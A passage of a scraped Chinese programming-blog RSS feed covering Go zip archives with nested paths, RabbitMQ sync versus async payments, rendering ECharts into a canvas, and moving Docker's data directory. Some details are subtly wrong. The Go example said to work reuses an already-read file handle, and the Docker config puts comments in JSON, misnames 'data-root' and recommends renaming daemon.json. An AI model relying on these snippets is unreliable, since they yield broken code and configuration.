}这样可以得到一个path的压缩文件，打开如下：想要得到一个具备层级的压缩文件，如下图：需要先做的是创建所需的层级。即，如果想要在压缩文件中呈现：压缩文件:北京/朝阳区/美食地图.jpg需要先创建 “北京/朝阳区/” 这个路径，而创建文件夹和创建文件的方式是一样的：// 创建一个路径_, err = zipWriter.Create("北京/朝阳区")if err != nil {panic(err)}合起来就是：func pathZip(path string) {// 创建 zip 文件zipFile, err := os.Create("test.zip")if err != nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter := zip.NewWriter(zipFile)defer zipWriter.Close()// 创建一个路径_, err = zipWriter.Create("北京/朝阳区")if err != nil {panic(err)}// 创建一个压缩包中的文件fileWriter, err := zipWriter.Create("北京/朝阳区/美食地图.jpg")if err != nil {panic(err)}// 打开要压缩的文件f, err := os.Open(path)if err != nil {panic(err)}defer f.Close()// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter, f); err != nil {panic(err)}// zipWriter.Close() 在 defer 中已经处理println("ZIP 文件创建成功!")
}注意，顺序不可以颠倒，要先创建路径，然后创建文件，然后再把文件拷贝到压缩包中。如果要拷贝另一个文件，需要再创建一个文件且拷贝后才可以，不然之前的文件关闭了就无法再复制进去了。下面这样是不可行的：// 创建一个压缩包中的文件fileWriter, err := zipWriter.Create("美食地图.jpg")if err != nil {panic(err)}// 创建一个压缩包中的文件fileWriter2, err := zipWriter.Create("美食地图2.jpg")if err != nil {panic(err)}// 打开要压缩的文件f, err := os.Open(path)if err != nil {panic(err)}defer f.Close()// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter, f); err != nil {panic(err)}// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter2, f); err != nil {panic(err)}下面这样是可行的：// 创建一个压缩包中的文件fileWriter, err := zipWriter.Create("美食地图.jpg")if err != nil {panic(err)}// 打开要压缩的文件f, err := os.Open(path)if err != nil {panic(err)}defer f.Close()// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter, f); err != nil {panic(err)}// 创建一个压缩包中的文件fileWriter2, err := zipWriter.Create("美食地图2.jpg")if err != nil {panic(err)}// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter2, f); err != nil {panic(err)}成功了：http://www.ppmy.cn/news/1540874.html相关文章原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:49 +0000</pubDate>
    </item>
    <item>
      <title>原理代码解读：基于DiT结构视频生成模型的ControlNet</title>
      <link>https://www.ppmy.cn/news/1540873.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维原理代码解读：基于DiT结构视频生成模型的ControlNetnews/2025/10/31 23:18:48/Diffusion Models视频生成-博客汇总前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从原理和代码上重点解读一下。目录原理讲解代码讲解DataLoader第一步：VAE压缩Pose编码第二步：直接concat第三步：转换成embedding效果总结原理讲解基于开源的CogVideox FUN 5B模型，使用Pose控制信号替代了原本的mask信号，将控制信号使用VAE编码后作为Guidance与latent一起进入patch流程。在0.48m数据中进行了筛选，选择出大约20000包含人像的视频与图片进行pose提取，作为condition控制信号进行训练。在进行训练时，我们根据不同Tokehttp://www.ppmy.cn/news/1540873.html相关文章RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:48 +0000</pubDate>
    </item>
    <item>
      <title>RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较</title>
      <link>https://www.ppmy.cn/news/1540872.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较news/2025/10/31 23:18:47/在支付场景中，使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比，响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较：1.同步处理方式在同步模式下，支付消息的处理流程通常是：请求发出后，支付系统立即处理请求，直到整个操作完成并返回结果。在支付系统中，处理通常涉及多个步骤，如：校验支付信息执行支付处理更新数据库返回支付结果给用户优点：直接反馈：客户端能够立即得到处理结果，用户体验简单明了。流程简单：整个支付流程清晰直观，便于理解和追踪。缺点：响应速度慢：同步处理要求客户端等待整个流程完成。这意味着，任何一个步骤的延迟（如第三方支付网关的延迟或数据库写入延迟）都会直接影响用户的等待时间。阻塞性操作：在同步模式下，客户端会被阻塞，必须等待服务器的处理完成，系统的吞吐量相对较低。每个请求处理时，系统资源（如线程和内存）都会被占用，限制了系统的并发能力。2.异步处理方式（通过 RabbitMQ）异步处理通过 RabbitMQ 这样的消息队列中间件，将支付消息投递到队列中进行后续处理，而无需等待处理结果的返回。这种方式中，支付请求通常按以下流程进行：用户发起支付请求。支付系统将支付请求消息发送到 RabbitMQ。用户立即收到确认消息（例如“支付请求已接受”），无需等待实际支付处理完成。后端系统异步处理支付消息，并通过队列或其他机制反馈最终结果。优点：快速响应：在异步模式下，用户不需要等待整个支付流程完成即可收到反馈，因此响应速度明显快于同步处理。通常情况下，用户会立即收到“请求已受理”的信息，而不必等待具体支付操作完成。提高系统吞吐量：异步处理将支付请求排队，后端系统根据自己的能力按顺序处理，避免了请求的阻塞。同时，异步处理可以通过增加消费者的数量来提高并发能力，从而更好地利用系统资源。故障隔离：如果某个支付服务出现延迟或故障，不会立即影响用户体验。消息队列能够持久化未处理的消息，待问题解决后继续处理。缺点：最终一致性：用户不会立即得到最终的支付结果，需要通过额外的机制（如状态查询、消息通知等）了解支付是否成功。这种方式要求系统能够处理支付结果的延迟和查询。系统复杂性增加：引入消息队列增加了系统的复杂性，包括消息的可靠性、幂等性和消息消费的管理等。3.同步与异步响应速度比较处理方式响应速度并发处理能力系统资源消耗用户体验同步相对较慢（取决于具体支付操作的耗时，可能需要几百毫秒到几秒钟）较低（系统资源被请求阻塞，响应完成前不能处理新的请求）高（每个请求在处理完成之前占用系统资源）用户需要等待支付完成异步（通过 RabbitMQ）较快（通常在几十毫秒内用户就能得到“请求已受理”的反馈）高（后端可以批量处理消息，无需等待处理完成再接受新请求）低（系统资源释放较快，处理效率提升）用户立即得到反馈，但需要后续查询支付结果4.响应速度具体比较同步模式：用户发起支付请求，直到支付处理完成后才返回结果。如果支付涉及外部支付网关、数据库操作等，响应时间可能达到500 毫秒至几秒钟，具体取决于各个步骤的处理速度。异步模式（使用 RabbitMQ）：用户发起支付请求后，支付消息立即进入队列，用户可以在几十毫秒内收到“请求已受理”的反馈，而不必等待整个支付流程的完成。后续支付处理可以在队列中异步完成，因此前端的响应速度通常要远快于同步模式。5.适用场景同步模式适用于对实时性要求较高、用户希望立即看到支付结果的场景，如小额支付、交易所等。异步模式适用于大规模高并发支付场景，特别是支付量较大、且用户能接受稍后查询结果的情况。使用 RabbitMQ 这样的消息队列，可以确保在高并发场景下，系统不会因支付处理压力过大而影响用户体验。小结异步处理（通过 RabbitMQ）相比同步处理，在响应速度上具有显著优势，因为它能够快速释放前端请求，使用户在极短时间内得到确认反馈。同时，异步处理还能提高系统的吞吐量，减少同步模式中资源占用过多的问题。对于高并发、需要迅速响应的支付场景，异步处理是一种更为高效的方式。http://www.ppmy.cn/news/1540872.html相关文章如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:47 +0000</pubDate>
    </item>
    <item>
      <title>如何将 ECharts 图表插入 HTML Canvas</title>
      <link>https://www.ppmy.cn/news/1540871.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维如何将 ECharts 图表插入 HTML Canvasnews/2025/10/31 23:18:46/在 Web 开发中，数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库，而 HTML5 Canvas 则提供了灵活的绘图能力。今天，我们将探讨如何将这两者结合起来，实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。为什么要这样做？将 ECharts 图表插入 Canvas 可能看起来有些多此一举，但在某些场景下，这种方法非常有用：当你需要在 Canvas 上绘制复杂的自定义图形，同时又想包含 ECharts 的图表时。如果你正在开发一个图像编辑器，想要将 ECharts 图表作为一个图层。当你需要将多个图表组合成一个单一的图像时。步骤详解让我们一步步来看如何实现这个功能。1. 准备 HTML 结构首先，我们需要准备基本的 HTML 结构：&lt;!DOCTYPEhtml&gt;&lt;htmllang="zh-CN"&gt;&lt;head&gt;&lt;metacharset="UTF-8"&gt;&lt;metaname="viewport"content="width=device-width, initial-scale=1.0"&gt;&lt;title&gt;ECharts 图表插入 Canvas 示例&lt;/title&gt;&lt;scriptsrc="https://cdnjs.cloudflare.com/ajax/libs/echarts/5.4.2/echarts.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;divid="chart"style="width:600px;height:400px;"&gt;&lt;/div&gt;&lt;canvasid="myCanvas"width="800"height="600"style="border:1px solid #000000;"&gt;&lt;/canvas&gt;&lt;script&gt;// 这里将放置我们的 JavaScript 代码&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;这里我们创建了两个关键元素：一个div元素用于初始渲染 ECharts 图表一个canvas元素，这是我们最终要将图表绘制到的地方2. 创建和配置 ECharts 图表接下来，我们需要初始化 ECharts 实例并设置图表配置：// 初始化 ECharts 实例varmyChart=echarts.init(document.getElementById('chart'));// 指定图表的配置项和数据varoption={title:{text:'ECharts 示例'},tooltip:{},legend:{data:['销量']},xAxis:{data:["衬衫","羊毛衫","雪纺衫","裤子","高跟鞋","袜子"]},yAxis:{},series:[{name:'销量',type:'bar',data:[5,20,36,10,10,20]}]};// 使用刚指定的配置项和数据显示图表。myChart.setOption(option);这段代码创建了一个简单的柱状图。你可以根据需要自定义图表类型和数据。3. 将 ECharts 图表渲染到 Canvas最后，也是最关键的一步，我们需要将 ECharts 图表渲染到 Canvas 中：// 将 ECharts 图表渲染为图片myChart.on('finished',function(){varbase64=myChart.getDataURL();varimg=newImage();img.src=base64;img.onload=function(){varcanvas=document.getElementById('myCanvas');varctx=canvas.getContext('2d');// 在 canvas 的指定位置 (100, 100) 绘制图表ctx.drawImage(img,100,100);}});这段代码做了以下几件事：监听 ECharts 图表渲染完成的事件。使用getDataURL()方法获取图表的 base64 编码的图片数据。创建一个新的 Image 对象，并将其源设置为刚刚获取的 base64 数据。当图片加载完成后，使用 Canvas 的drawImage方法将图片绘制到 Canvas 上的指定位置。结语通过这种方法，我们成功地将 ECharts 生成的图表插入到了 HTML Canvas 中的指定位置。这为我们提供了更大的灵活性，允许我们在 Canvas 中组合多种元素，包括 ECharts 图表。你可以进一步探索这种技术，例如：在 Canvas 中添加多个 ECharts 图表在图表周围绘制额外的图形或文本将整个 Canvas 导出为图片http://www.ppmy.cn/news/1540871.html相关文章docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...vue中如何自定义Form表单rules校验方法（手机号/座机号、身份证号/社会统一信代码校验，支持多个，以英文逗号分隔）需求描述&amp;#xff1a; 1.相对方联系方式需要支持手机号、座机号填入保存&amp;#xff0c;可能会填写多个都需要校验是否能通过 2.相对方统一社会信用代码/身份证号码填入&amp;#xff0c;可以是身份证号码也可以是社会统一信用代码&amp;#xff0c;都得支持校验通过&amp;#xff0c;并且容许填入…阅读更多...ComfyUI绘画|文生图基础工作流搭建学好 AI绘画 不论是就业还是做副业赚钱都不错&amp;#xff0c;但要学会 AI绘画 还是要有一个学习规划。最后大家分享一份全套的 AI绘画 学习资料&amp;#xff0c;给那些想学习 AI绘画 的小伙伴们一点帮助&amp;#xff01; 
设置中文界面 
方式一 这份完整版的AI绘画全套学习资料已经上传CSD…阅读更多...AGI 之 【Dify】 之 使用 Docker 在 Windows 端本地部署 Dify 大语言模型（LLM）应用开发平台AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 目录 
AGI 之 【Dify】 之  使用 Docker 在 Windows 端本地部署 Dify 大语言模型&amp;#xff08;LLM&amp;#xff09;应用开发平台 
一、简单介绍 
二、Docker 下载安…阅读更多...【JavaEE初阶】深入理解TCP协议中的封装分用以及UDP和TCP在网络编程的区别前言 
&amp;#x1f31f;&amp;#x1f31f;本期讲解关于TCP/UDP协议的原理理解~~~ 
&amp;#x1f308;上期博客在这里&amp;#xff1a;【JavaEE初阶】入门视角-网络原理的基础理论的了解-CSDN博客 
&amp;#x1f308;感兴趣的小伙伴看一看小编主页&amp;#xff1a;GGBondlctrl-CSDN博客 
&amp;#x1f525; …阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:46 +0000</pubDate>
    </item>
    <item>
      <title>docker 文件目录迁移</title>
      <link>https://www.ppmy.cn/news/1540870.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维docker 文件目录迁移news/2025/10/31 23:18:45/文章参考du -hs /var/lib/docker/ 命令查看磁盘使用情况。du -hs /var/lib/docker/docker system df命令，类似于Linux上的df命令，用于查看Docker的磁盘使用情况:root@nn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2GB 79.07GB (64%)
Containers 2 2 61.96GB 0B (0%)
Local Volumes 0 0 0B 0B
Build Cache 0 0 0B 0B迁移 /var/lib/docker 目录停止docker服务。systemctl stop dockersystemctl stop docker.socket创建新的docker目录，执行命令df -h,找一个大的磁盘。 我在 /home目录下面建了 /home/docker/lib目录，执行的命令是：mkdir -p /home/docker/lib迁移/var/lib/docker目录下面的文件到 /home/docker/lib：rsync -avz /var/lib/docker /home/docker/lib/修改vim /usr/lib/systemd/system/docker.service搜索ExecStart在ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock添加--data-root=/home/docker/lib/docker修改/etc/docker/daemon.conf{"registry-mirrors": ["https://docker.m.daocloud.io","https://dockerhub.icu","https://docker.anyhub.us.kg","https://docker.1panel.live"],"log-driver":"json-file","log-opts":{"max-size" :"50m","max-file":"3"},"graph":"/home/docker/lib/docker"    #  docker  低版本使用  graph"root-data":"/home/docker/lib/docker"    #  docker  高版本使用  root-data
}重新加载 dockersystemctl daemon-reloadsystemctl restart dockersystemctl enable docker如果启动失败 输入systemctl status docker.service查看错误日志为了确认一切顺利，运行# docker info命令检查Docker 的根目录.它将被更改为 /home/docker/lib/docker...
Docker Root Dir: /home/docker/lib/docker
Debug Mode (client): false
Debug Mode (server): false
Registry: https://index.docker.io/v1/
...确定容器没问题后删除/var/lib/docker/目录中的文件。问题docker.service - Docker Application Container Engine Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; vendor preset: disabled) Active: failed (Result: start-limit) since 一 2019-07-15 23:29:49 CST; 4min 59s ago Docs: https://docs.docker.com Process: 31870 ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock (code=exited, status=1/FAILURE) Main PID: 31870 (code=exited, status=1/FAILURE)将/etc/docker/daemon.json改后缀 为.confhttp://www.ppmy.cn/news/1540870.html相关文章【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 